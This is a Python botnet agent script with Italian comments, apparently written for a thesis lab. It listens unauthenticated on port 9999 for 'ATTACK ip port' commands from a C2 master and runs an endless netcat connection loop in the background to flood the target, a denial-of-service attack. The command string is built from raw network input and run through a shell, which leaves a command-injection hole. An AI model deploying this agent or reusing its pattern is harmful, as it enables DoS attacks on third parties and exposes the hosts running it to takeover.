#!/usr/bin/env python3
# Questo script gira su ogni macchina zombie (es. porta 9999)
import socket
import subprocess

def listen_for_commands():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Rimane in ascolto su tutte le interfacce dello zombie alla porta 9999
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(1)
    print("[Zombie] In attesa di comandi dal Master C2...")

    while True:
        conn, addr = server_socket.accept()
        print(f"[Zombie] Connesso al Master: {addr}")
        
        # Riceve l'istruzione (es: "ATTACK 10.0.2.50 9000")
        data = conn.recv(1024).decode().strip()
        if data.startswith("ATTACK"):
            _, target_ip, target_port = data.split()
            print(f"[Zombie] Avvio attacco DoS contro {target_ip}:{target_port}")
            
            # Esegue un loop infinito per saturare la vittima (es. via netcat o simulando richieste)
            # In una tesi, un loop bash che bombarda la porta della vittima è perfetto:
            cmd = f"while true; do nc -w 1 {target_ip} {target_port} < /dev/null; done"
            # Popen avvia il processo in background senza bloccare lo script
            subprocess.Popen(cmd, shell=True)
            
        conn.close()

if __name__ == "__main__":
    listen_for_commands()
